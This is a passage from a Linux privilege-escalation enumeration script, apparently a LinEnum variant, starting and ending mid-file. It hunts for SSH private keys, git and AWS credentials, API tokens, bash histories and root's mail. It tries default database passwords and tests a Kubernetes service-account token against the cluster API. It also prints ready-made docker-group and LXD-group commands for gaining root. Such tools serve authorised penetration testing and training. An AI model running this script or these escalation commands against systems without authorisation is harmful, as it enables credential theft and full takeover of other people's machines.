    ls -lah /root 2>/dev/null
else
    echo -e "${GREEN}Cannot access /root${NC}"
fi

# ============================================================================
# SUID/SGID FILES & CAPABILITIES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SUID/SGID FILES & CAPABILITIES (HIGH PRIORITY)            ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Files with capabilities:"
cap_result=$(/usr/sbin/getcap -r / 2>/dev/null)
if [ ! -z "$cap_result" ]; then
    echo -e "$cap_result${NC}"
else
    echo -e "${GREEN}No capabilities found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}SUID files (runs as owner - potential privesc):"
find / -perm -u=s -type f 2>/dev/null | while read file; do
    echo -e "$file${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}SGID files (runs as group):"
find / -perm -g=s -type f 2>/dev/null | while read file; do
    echo -e "$file${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}World-writable SUID files (CRITICAL):"
wwsuid=$(find / -perm -4002 -type f 2>/dev/null)
if [ "$wwsuid" ]; then
    echo -e "\033[1;31;103mWorld-writable SUID files found!\033[0m"

    echo -e "${LRED}$wwsuid${NC}"
else
    echo -e "${GREEN}None found${NC}"
fi

echo -e "\n${LMAGENTA}[!] For SUID/SGID exploitation automation:${NC}"
echo -e "${LMAGENTA}    https://github.com/strikoder/gtfobinSUID${NC}"

# ============================================================================
# SCHEDULED TASKS (CRON & SYSTEMD TIMERS)
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SCHEDULED TASKS (CRON & SYSTEMD TIMERS)                   ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}System-wide crontab (/etc/crontab):"
if [ -r /etc/crontab ]; then
    cat /etc/crontab 2>/dev/null | grep -v "^#"
else
    echo -e "${GREEN}Cannot read /etc/crontab${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Current user's crontab:"
crontab -l 2>/dev/null || echo -e "${GREEN}No crontab for current user${NC}"

echo -e "\n${YELLOW}[+] ${NC}Cron job directories:"
ls -lah /etc/cron* 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Writable cron directories:"
writable_cron=$(find /etc/cron* -type d -writable 2>/dev/null)
if [ "$writable_cron" ]; then
    echo -e "\033[1;31;103mWritable cron directories found!\033[0m"

    echo -e "${LRED}$writable_cron${NC}"
else
    echo -e "${GREEN}No writable cron directories${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}World-writable cron files:"
ww_cron=$(find /etc/cron* -perm -0002 -type f 2>/dev/null)
if [ "$ww_cron" ]; then
    echo -e "\033[1;31;103mWorld-writable cron files found!\033[0m"

    echo -e "${LRED}$ww_cron${NC}"
else
    echo -e "${GREEN}No world-writable cron files${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Systemd timers:"
systemd_timers=$(systemctl list-timers --all 2>/dev/null)
if [ "$systemd_timers" ]; then
    echo -e "$systemd_timers${NC}"
else
    echo -e "${GREEN}No systemd timers or systemctl not available${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Systemd timer unit files:"
find /etc/systemd/system /lib/systemd/system -name "*.timer" -exec ls -lah {} \; 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Jobs held by all users:"
for user in $(cut -d: -f1 /etc/passwd 2>/dev/null | head -20); do
    user_cron=$(crontab -l -u $user 2>/dev/null | grep -v "^#")
    if [ ! -z "$user_cron" ]; then
        echo -e "${CYAN}Crontab for $user${NC}"
        echo -e "${CYAN}$user_cron${NC}"
    fi
done

echo -e "\n${YELLOW}[+] ${NC}Recent cron executions from syslog:"
grep "CRON" /var/log/syslog 2>/dev/null | tail -10

# ============================================================================
# SERVICES & PROCESSES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SERVICES & PROCESSES                                      ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Running processes:"
ps aux 2>/dev/null | head -20

echo -e "\n${YELLOW}[+] ${NC}Process binary permissions:"
ps aux 2>/dev/null | awk '{print $11}' | sort -u | xargs -r ls -la 2>/dev/null | head -20

echo -e "\n${YELLOW}[+] ${NC}Systemd services:"
systemctl list-units --type=service --state=running 2>/dev/null | head -20 | sed 's/^[[:space:]]*//'

echo -e "\n${YELLOW}[+] ${NC}Init.d services:"
ls -lah /etc/init.d 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Init.d files NOT owned by root:"
initd_non_root=$(find /etc/init.d/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null)
if [ "$initd_non_root" ]; then
    echo -e "\033[1;31;103mInit.d files NOT owned by root!\033[0m"

    echo -e "${LRED}$initd_non_root${NC}"
else
    echo -e "${GREEN}All init.d files owned by root${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Systemd service files NOT owned by root:"
systemd_non_root=$(find /lib/systemd/system /etc/systemd/system \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null)
if [ "$systemd_non_root" ]; then
    echo -e "\033[1;31;103mSystemd files NOT owned by root!\033[0m"

    echo -e "${LRED}$systemd_non_root${NC}"
else
    echo -e "${GREEN}All systemd files owned by root${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Writable systemd service files:"
systemd_writable=$(find /lib/systemd/system /etc/systemd/system -writable -type f 2>/dev/null | xargs -r ls -la 2>/dev/null)
if [ "$systemd_writable" ]; then
    echo -e "\033[1;31;103mWritable systemd service files!\033[0m"

    echo -e "${LRED}$systemd_writable${NC}"
else
    echo -e "${GREEN}No writable systemd service files${NC}"
fi

# ============================================================================
# NETWORK INFORMATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ NETWORK INFORMATION                                       ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Network interfaces:"
ip a 2>/dev/null || ifconfig 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Network connections and listening ports:"
(netstat -tunlp 2>/dev/null || ss -tunlp 2>/dev/null) | head -30

echo -e "\n${YELLOW}[+] ${NC}Routing table:"
route -n 2>/dev/null || ip route 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}ARP cache:"
arp -a 2>/dev/null || ip n 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}DNS servers:"
grep "nameserver" /etc/resolv.conf 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Hosts file:"
cat /etc/hosts 2>/dev/null | grep -v "^#"

echo -e "\n${YELLOW}[+] ${NC}Firewall rules (iptables):"
iptables -L -n 2>/dev/null || echo -e "${GREEN}Cannot read iptables${NC}"

# ============================================================================
# DATABASE ENUMERATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ DATABASE ENUMERATION                                      ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}MySQL version:"
mysql_ver=$(mysql --version 2>/dev/null)
if [ "$mysql_ver" ]; then
    echo -e "$mysql_ver${NC}"

    echo -e "\n${YELLOW}[+] ${NC}Testing MySQL root/root:"
    mysql_root=$(mysqladmin -uroot -proot version 2>/dev/null)
    if [ "$mysql_root" ]; then
        echo -e "\033[1;31;103mMySQL accepts root/root!\033[0m"

    else
        echo -e "${GREEN}root/root failed${NC}"
    fi

    echo -e "\n${YELLOW}[+] ${NC}Testing MySQL root (no password):"
    mysql_nopass=$(mysqladmin -uroot version 2>/dev/null)
    if [ "$mysql_nopass" ]; then
        echo -e "\033[1;31;103mMySQL root has no password!\033[0m"

    else
        echo -e "${GREEN}root no-password failed${NC}"
    fi
else
    echo -e "${GREEN}MySQL not installed${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}PostgreSQL version:"
psql_ver=$(psql -V 2>/dev/null)
if [ "$psql_ver" ]; then
    echo -e "${CYAN}$psql_ver${NC}"

    echo -e "\n${YELLOW}[+] ${NC}Testing PostgreSQL postgres user:"
    psql_test=$(psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version)
    if [ "$psql_test" ]; then
        echo -e "\033[1;31;103mPostgreSQL 'postgres' no password!\033[0m"

    else
        echo -e "${GREEN}postgres no-password failed${NC}"
    fi
else
    echo -e "${GREEN}PostgreSQL not installed${NC}"
fi

# ============================================================================
# WEB SERVER ENUMERATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ WEB SERVER ENUMERATION                                    ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Apache version:"
apache_ver=$(apache2 -v 2>/dev/null || httpd -v 2>/dev/null)
if [ "$apache_ver" ]; then
    echo -e "$apache_ver${NC}"

    echo -e "\n${YELLOW}[+] ${NC}Apache user/group:"
    apache_user=$(grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null | awk '{sub(/.*export /,"")}1')
    if [ "$apache_user" ]; then
        echo -e "${CYAN}$apache_user${NC}"
    else
        echo -e "${GREEN}Cannot read Apache envvars${NC}"
    fi

    echo -e "\n${YELLOW}[+] ${NC}Apache modules:"
    apache_mods=$(apache2ctl -M 2>/dev/null || httpd -M 2>/dev/null | head -20)
    if [ "$apache_mods" ]; then
        echo -e "$apache_mods${NC}"
    fi
else
    echo -e "${GREEN}Apache not installed${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Nginx version:"
nginx -v 2>&1 | grep -i version || echo -e "${GREEN}Nginx not installed${NC}"

echo -e "\n${YELLOW}[+] ${NC}Web directories:"
for webdir in /var/www /srv/www /usr/local/www /opt/lampp/htdocs; do
    if [ -d "$webdir" ]; then
        echo -e "$webdir exists${NC}"
        ls -lah "$webdir" 2>/dev/null | head -10
    fi
done

echo -e "\n${YELLOW}[+] ${NC}/opt directory contents:"
if [ -d /opt ]; then
    ls -lah /opt 2>/dev/null
    echo -e "\n${YELLOW}[+] ${NC}Interesting files in /opt (configs, scripts, binaries):"
    find /opt -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" \
        -o -name "*.env" -o -name "*.sh" -o -name "*.py" -o -name "*.rb" -o -name "*.php" \
        -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) 2>/dev/null | head -20 | while read f; do
        echo -e "${CYAN}$f${NC}"
    done
    echo -e "\n${YELLOW}[+] ${NC}SUID/SGID files in /opt:"
    opt_suid=$(find /opt \( -perm -u=s -o -perm -g=s \) -type f 2>/dev/null)
    if [ -n "$opt_suid" ]; then
        echo -e "\033[1;31;103mSUID/SGID files found in /opt!\033[0m"
        echo "$opt_suid" | while read f; do echo -e "${LRED}$f${NC}"; done
    else
        echo -e "${GREEN}None found${NC}"
    fi
    echo -e "\n${YELLOW}[+] ${NC}World-writable files in /opt:"
    opt_ww=$(find /opt -perm -o+w -type f 2>/dev/null)
    if [ -n "$opt_ww" ]; then
        echo -e "\033[1;31;103mWorld-writable files in /opt!\033[0m"
        echo "$opt_ww" | while read f; do echo -e "${LRED}$f${NC}"; done
    else
        echo -e "${GREEN}None found${NC}"
    fi
else
    echo -e "${GREEN}/opt does not exist${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Apache/Nginx sites-enabled configs:"
for sitesdir in /etc/apache2/sites-enabled /etc/nginx/sites-enabled /etc/nginx/conf.d /etc/httpd/conf.d; do
    if [ -d "$sitesdir" ]; then
        echo -e "${CYAN}$sitesdir:${NC}"
        ls -lah "$sitesdir" 2>/dev/null
        for f in "$sitesdir"/*; do
            [ -f "$f" ] || continue
            echo -e "\n${YELLOW}--- $f ---${NC}"
            grep -vE "^\s*(#|$)" "$f" 2>/dev/null | head -30
        done
    fi
done

# ============================================================================
# SHELL & PROFILE FILES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SHELL & PROFILE FILES                                     ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Current user's shell config files:"
for file in ~/.bash_profile ~/.bashrc ~/.bash_logout ~/.profile ~/.zshrc; do
    if [ -r "$file" ]; then
        echo -e "${CYAN}$file (readable)${NC}"
        ls -lah "$file" 2>/dev/null
    fi
done

echo -e "\n${YELLOW}[+] ${NC}System-wide shell configs:"
for file in /etc/profile /etc/bashrc /etc/bash.bashrc; do
    if [ -r "$file" ]; then
        ls -lah "$file" 2>/dev/null
    fi
done

echo -e "\n${YELLOW}[+] ${NC}All .bash_history files:"
all_bash_history=$(find /home /root -name ".bash_history" -type f 2>/dev/null)
if [ "$all_bash_history" ]; then
    for hist_file in $all_bash_history; do
        ls -lah "$hist_file" 2>/dev/null
        if [ -r "$hist_file" ]; then
            echo -e "${YELLOW}    Last 5 commands:${NC}"
            tail -5 "$hist_file" 2>/dev/null | while read line; do
                echo -e "${RED}    $line${NC}"
            done
            echo ""
        fi
    done
else
    echo -e "${GREEN}No .bash_history files found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}All shell history files (.*_history):"
find /home /root -type f -name ".*_history" 2>/dev/null | head -10 | while read hist; do
    echo -e "${CYAN}$hist${NC}"
    ls -lah "$hist" 2>/dev/null
done

echo -e "\n${YELLOW}[+] ${NC}Current user's recent command history:"
history 2>/dev/null | tail -20

# ============================================================================
# SSH KEYS & CONFIG
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SSH KEYS & CONFIGURATION                                  ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}SSH private keys:"
for keytype in id_rsa id_ecdsa id_ed25519 id_dsa; do
    keys=$(find / -name "$keytype" -type f 2>/dev/null | head -10)
    if [ "$keys" ]; then
        for key in $keys; do
            echo -e "${LRED}$key${NC}"
            ls -lah "$key" 2>/dev/null
            if [ -r "$key" ]; then
                echo -e "\033[1;31;103mREADABLE! Can be exfiltrated\033[0m"

            fi
        done
    fi
done

echo -e "\n${YELLOW}[+] ${NC}SSH authorized_keys files:"
find / -name authorized_keys -type f 2>/dev/null | head -10 | while read authkey; do
    echo -e "${CYAN}$authkey${NC}"
    ls -lah "$authkey" 2>/dev/null
    if [ -w "$authkey" ]; then
        echo -e "\033[1;31;103mWRITABLE!\033[0m"

    fi
done

echo -e "\n${YELLOW}[+] ${NC}SSH config files:"
for sshconf in /etc/ssh/sshd_config /etc/ssh/ssh_config ~/.ssh/config; do
    if [ -r "$sshconf" ]; then
        ls -lah "$sshconf" 2>/dev/null
    fi
done

echo -e "\n${YELLOW}[+] ${NC}SSH root login permitted?"
sshrootlogin=$(grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#")
if echo "$sshrootlogin" | grep -q "yes"; then
    echo -e "YES - Root can login via SSH"

    echo -e "$sshrootlogin${NC}"
else
    echo -e "${GREEN}Root login disabled or restricted${NC}"
fi

# ============================================================================
# WRITABLE LOCATIONS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ WRITABLE LOCATIONS                                        ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Writable files for current user (first 20):"
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -writable -print 2>/dev/null | head -20 | while read dir; do
    echo -e "${RED}$dir${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Writable directories for current user (first 20):"
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type d -writable -print 2>/dev/null | head -20 | while read dir; do
    echo -e "${RED}$dir${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}World-writable files (first 30):"
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -type f -perm -o+w -print 2>/dev/null | head -30 | while read file; do
    echo -e "${LRED}$file${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}World-writable directories (first 30):"
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -type d -perm -o+w -print 2>/dev/null | head -30 | while read dir; do
    echo -e "${LRED}$dir${NC}"
done

# ============================================================================
# INTERESTING FILES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ INTERESTING FILES                                         ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Useful binaries:"
for tool in wget curl nc netcat ncat python python3 perl ruby socat gcc cc make; do
    path=$(which $tool 2>/dev/null)
    [ -n "$path" ] && echo -e "$tool at $path"
done

echo -e "\n${YELLOW}[+] ${NC}.plan files:"
plan_files=$(find /home /root -name "*.plan" -type f 2>/dev/null)
if [ "$plan_files" ]; then
    for plan in $plan_files; do
        echo -e "${CYAN}$plan${NC}"
        ls -lah "$plan" 2>/dev/null
        if [ -r "$plan" ]; then
            echo -e "${YELLOW}    Contents (first 5 lines):${NC}"
            head -5 "$plan" 2>/dev/null
        fi
    done
else
    echo -e "${GREEN}No .plan files found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Backup files (.bak, .old, .backup):"
find / -path "/usr/local/lib/python*" -prune -o -type f \( -name "*.bak" -o -name "*.old" -o -name "*.backup" \) -print 2>/dev/null | head -20 | while read -r bak; do
    echo -e "${bak}${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Recently modified files (last 10 minutes):"
find / \( -path /proc -o -path /sys \) -prune -o -type f -mmin -10 -print 2>/dev/null | head -20

echo -e "\n${YELLOW}[+] ${NC}Hidden files in /home:"
find /home -name ".*" -type f 2>/dev/null | head -20 | while read hidden; do
    echo -e "${CYAN}$hidden${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Shell scripts (first 30):"
find / \( -path /usr/src -o -path /usr/share -o -path /snap \) -prune -o -type f -name "*.sh" 2>/dev/null | head -30 | while read script; do
    echo -e "$script"
done

echo -e "\n${YELLOW}[+] ${NC}Python scripts (first 30):"
find / \( -path /usr/src -o -path /usr/share -o -path /etc/init.d -o -path /usr/lib -o -path /snap -o -path /usr/local/lib \) -prune -o -type f -name "*.py" 2>/dev/null | head -30 | while read script; do
    echo -e "$script"
done

# ============================================================================
# PASSWORD HUNTING
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ PASSWORD HUNTING                                          ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Files with 'password' in name (first 20):"
locate password 2>/dev/null | head -20 || find / -name "*password*" -type f 2>/dev/null | head -20

echo -e "\n${YELLOW}[+] ${NC}Searching for passwords in common config files:"
grep -ri -m 20 --exclude="LinEnum-ng.sh" --exclude="linpeas.sh" "password\|passwd\|pwd" /var/www /etc/*.conf /home/*/.ssh 2>/dev/null | grep -v "Binary"

echo -e "\n${YELLOW}[+] ${NC}htpasswd files:"
htpasswd_files=$(find / -name .htpasswd -type f 2>/dev/null)
if [ "$htpasswd_files" ]; then
    echo -e "\033[1;31;103mhtpasswd files found!\033[0m"

    for htfile in $htpasswd_files; do
        echo -e "${LRED}$htfile${NC}"
        if [ -r "$htfile" ]; then
            head -3 "$htfile" 2>/dev/null
        fi
    done
else
    echo -e "${GREEN}No .htpasswd files found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}AWS credentials: ${CYAN}(may take some time)${NC}"
aws_keys=$(grep -rli --exclude="LinEnum-ng.sh" "aws_secret_access_key\|aws_access_key_id" /home /root 2>/dev/null | head -10)
if [ "$aws_keys" ]; then
    echo -e "\033[1;31;103mPossible AWS credentials!\033[0m"

    for aws_file in $aws_keys; do
        echo -e "${LRED}$aws_file${NC}"
    done
else
    echo -e "${GREEN}No AWS credentials found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Git credentials:"
git_creds=$(find / -name ".git-credentials" -type f 2>/dev/null)
if [ "$git_creds" ]; then
    echo -e "\033[1;31;103mGit credentials found!\033[0m"

    for git_file in $git_creds; do
        echo -e "${LRED}$git_file${NC}"
        if [ -r "$git_file" ]; then
            cat "$git_file" 2>/dev/null
        fi
    done
else
    echo -e "${GREEN}No git credentials found${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Database credentials in PHP:"
find /var/www /opt -name "*.php" -type f 2>/dev/null -exec grep -l "mysql_connect\|mysqli\|PDO\|pg_connect" {} \; | head -5 | while read php; do
    echo -e "${CYAN}$php${NC}"
    grep -i "password\|user" "$php" 2>/dev/null | head -3
done

echo -e "\n${YELLOW}[+] ${NC}API keys and tokens:"
api_hits=$(grep -rih \
    --include="*.conf" --include="*.config" --include="*.cfg" \
    --include="*.ini" --include="*.env" --include="*.yml" --include="*.yaml" \
    --include="*.json" --include="*.xml" --include="*.properties" \
    --include="*.txt" --include="*.sh" --include="*.py" --include="*.rb" --include="*.php" \
    --exclude="LinEnum-ng.sh" --exclude="linpeas.sh" \
    --exclude-dir={node_modules,vendor,.git,site-packages,dist-packages} \
    -E "(api_key|api_secret|apikey|access_token|bearer)[[:space:]]*[=:][[:space:]]*['\"]?[A-Za-z0-9_\-]{16,}" \
    /var/www /home 2>/dev/null \
    | grep -iv "example\|placeholder\|your[_-]\?key\|changeme\|dummy\|todo\|fixme\|#.*api\|\/\/.*api\|regexSearch\|\.add(\|Write-Error\|get-content\|apikey\.txt\|\.gitignore" \
    | head -20)

if [ -z "$api_hits" ]; then
    echo -e "${GREEN}No API keys found${NC}"
else
    line_count=$(echo "$api_hits" | wc -l)
    if [ "$line_count" -gt 6 ]; then
        echo -e "${YELLOW}Many results ($line_count lines) — showing first 6, investigate manually:${NC}"
        echo "$api_hits" | head -6 | while read line; do
            echo -e "${CYAN}$line${NC}"
        done
    else
        echo "$api_hits" | while read line; do
            echo -e "${CYAN}$line${NC}"
        done
    fi
fi

echo -e "\n${YELLOW}[+] ${NC}Private SSH keys (readable):"
grep -rl --exclude="LinEnum-ng.sh" "PRIVATE KEY-----" /home /root 2>/dev/null | head -10 | while read keyfile; do
    echo -e "${LRED}$keyfile${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Mail files:"
ls -lah /var/mail 2>/dev/null
if [ -r "/var/mail/root" ]; then
    echo -e "\033[1;31;103mCan read root's mail!\033[0m"

    head -10 /var/mail/root 2>/dev/null
fi

# ============================================================================
# DOCKER & CONTAINERS & PRIVILEGED GROUPS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ DOCKER & CONTAINERS & PRIVILEGED GROUPS                   ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Current user groups:"
id
current_groups=$(id | grep -oE '\([^)]+\)' | tr -d '()')

echo -e "\n${YELLOW}[+] ${NC}Are we in a container?"
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo -e "\033[1;31;103mYES - Running inside Docker container!\033[0m"

elif grep -qa container=lxc /proc/1/environ 2>/dev/null; then
    echo -e "\033[1;31;103mYES - Running inside LXC container!\033[0m"

elif [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] || \
     [ -d /var/run/secrets/kubernetes.io ] || \
     grep -q "kubepods" /proc/1/cgroup 2>/dev/null || \
     [ -n "$KUBERNETES_SERVICE_HOST" ]; then
    echo -e "\033[1;31;103mYES - Running inside a Kubernetes Pod!\033[0m"

    echo -e "\n${LMAGENTA}[+] ${NC}Kubernetes service account token:"
    if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo -e "\033[1;31;103mService account token is READABLE!\033[0m"
        token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        echo -e "${CYAN}${token:0:80}...${NC}"
    else
        echo -e "${GREEN}Token not readable${NC}"
    fi

    echo -e "\n${LMAGENTA}[+] ${NC}Kubernetes namespace:"
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo -e "${GREEN}Cannot read namespace${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Kubernetes API server:"
    echo -e "${CYAN}Host: ${KUBERNETES_SERVICE_HOST:-unknown}  Port: ${KUBERNETES_PORT_443_TCP_PORT:-443}${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Checking API server access with service account token:"
    if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        KUBE_API="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_PORT_443_TCP_PORT:-443}"
        api_test=$(curl -sk --max-time 5 \
            -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
            --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
            "$KUBE_API/api/v1/namespaces" 2>/dev/null)
        if echo "$api_test" | grep -q '"kind"'; then
            echo -e "\033[1;31;103mAPI server is REACHABLE and token is VALID!\033[0m"
            echo -e "${CYAN}    kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods${NC}"
        else
            echo -e "${YELLOW}API server unreachable or token has limited permissions${NC}"
        fi
    fi

    echo -e "\n${LMAGENTA}[+] ${NC}Environment variables leaking Kubernetes info:"
    env 2>/dev/null | grep -iE "KUBE|K8S|KUBERNETES" | grep -v "TOKEN"

else
    echo -e "${GREEN}No - Not in a container${NC}"
fi

# ============================================================================
# DOCKER GROUP PRIVILEGE ESCALATION
# ============================================================================
echo -e "\n${YELLOW}[+] ${NC}Docker group membership check:"
if echo "$current_groups" | grep -q docker || groups | grep -q docker; then
    echo -e "${LRED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LRED}║ \033[1;31;103mUSER IS IN DOCKER GROUP!                            ║\033[0m${NC}"
    echo -e "${LRED}║ ╚ PRIVILEGE ESCALATION POSSIBLE!                                 ║${NC}"
    echo -e "${LRED}╚══════════════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Docker socket status:"
    if [ -e /var/run/docker.sock ]; then
        ls -lah /var/run/docker.sock 2>/dev/null
        if [ -w /var/run/docker.sock ]; then
            echo -e "${LRED}Docker socket is WRITABLE!${NC}"
        fi
    fi

    echo -e "\n${LMAGENTA}[+] ${NC}Available Docker images:"
    docker image ls 2>/dev/null || echo -e "${YELLOW}Cannot list images${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}EXPLOITATION COMMANDS:"
    echo -e "${CYAN}    # Replace 'alpine' or 'bash' with any available image${NC}"
    echo -e "${CYAN}    docker run -v /:/mnt --rm -it alpine chroot /mnt sh${NC}"
    echo -e "${CYAN}    docker run -v /:/mnt --rm -it bash chroot /mnt sh${NC}"
    echo -e "${CYAN}    docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash${NC}"
    echo -e ""
else
    echo -e "${GREEN}Not in docker group${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Docker version:"
docker --version 2>/dev/null || echo -e "${GREEN}Docker not installed${NC}"

echo -e "\n${YELLOW}[+] ${NC}Docker containers:"
docker ps -a 2>/dev/null | head -10 || echo -e "${GREEN}Cannot list containers${NC}"

# ============================================================================
# LXC/LXD GROUP PRIVILEGE ESCALATION
# ============================================================================
echo -e "\n${YELLOW}[+] ${NC}LXC/LXD group membership check:"
if echo "$current_groups" | grep -qE 'lxd|lxc' || groups | grep -qE 'lxd|lxc'; then
    echo -e "${LRED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LRED}║ \033[1;31;103mUSER IS IN LXD/LXC GROUP!                           ║\033[0m${NC}"
    echo -e "${LRED}║ ╚ PRIVILEGE ESCALATION POSSIBLE!                                 ║${NC}"
    echo -e "${LRED}╚══════════════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Checking for existing container images:"
    ls / 2>/dev/null | grep -iE 'image|container|tar' || echo -e "${YELLOW}No obvious image files in /${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Searching for .tar images (potential templates):"
    find / -iname '*.tar*' -o -iname '*template*' 2>/dev/null | grep -iE 'lx|alpine|ubuntu|container' | head -10

    echo -e "\n${LMAGENTA}[+] ${NC}LXC/LXD images available:"
    lxc image list 2>/dev/null || echo -e "${YELLOW}Cannot list LXC images (may need to initialize)${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}LXC/LXD containers:"
    lxc list 2>/dev/null || echo -e "${YELLOW}Cannot list LXC containers${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}EXPLOITATION COMMANDS:"
    echo -e "${CYAN}    # Option A: Using existing image on system (e.g., ubuntu-template.tar.xz)${NC}"
    echo -e "${CYAN}    lxc image import ubuntu-template.tar.xz --alias ubuntutemp${NC}"
    echo -e "${CYAN}    lxc init ubuntutemp privesc -c security.privileged=true${NC}"
    echo -e "${CYAN}    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true${NC}"
    echo -e "${CYAN}    lxc start privesc${NC}"
    echo -e "${CYAN}    lxc exec privesc /bin/bash${NC}"
